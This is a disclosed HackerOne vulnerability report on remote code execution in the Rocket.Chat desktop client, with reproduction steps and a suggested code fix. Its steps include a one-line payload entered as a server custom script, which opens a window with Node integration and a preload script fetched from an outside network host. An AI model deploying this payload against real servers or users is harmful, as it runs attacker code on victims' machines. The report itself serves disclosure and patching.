# Remote Code Execution in Rocket.Chat-Desktop

## Report Details
- **Report ID**: 943725
- **URL**: https://hackerone.com/reports/943725
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-07-27T12:00:29.604Z
- **Disclosed**: 2020-11-07T14:40:26.343Z

## Reporter
- **Username**: sectex
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
**Description:** Rocket.Chat-Desktop is vulnerable to remote code execution.
An attacker is able to create new BrowserWindow instances with a malicious preload script.

## Releases Affected:

  * Rocket.Chat-Desktop-Client: < v3.0.0-develop

## Steps To Reproduce (by setting up a malicious server):
  1. Go to `Administration » Layout » Custom Scripts » Custom Script for Logged In Users`
  1. Insert the following script:
  `window.open('data:text/html,<h1>PWNED</h1>', '', ['nodeIntegration=true', 'preload=\\\\45.155.173.235\\data\\cmd.js'].join(','))`
  1. Click `Save changes`
  1. Open Rocket.Chat-Desktop and connect to the server
  1. CMD.exe will pop up.

## Suggested mitigation

  * [`src » preload » jitsi.js`](https://github.com/RocketChat/Rocket.Chat.Electron/blob/develop/src/preload/jitsi.js)
  ```
  const wrapWindowOpen = (defaultWindowOpen) => (href, frameName, features) => {
       const settings = getSettings();

       features = ''; // <- should fix it

       if (settings && url.parse(href).host === settings.get('Jitsi_Domain')) {
         features = [
           features,
           'nodeIntegration=true',
           `preload=${ `${ remote.app.getAppPath() }/app/preload.js` }`,
         ].join(',');
       }

       return defaultWindowOpen.call(window, href, frameName, features);
  };
  ```

## Impact

Remote Code Execution in Rocket.Chat-Desktop

## Attachments
No attachments
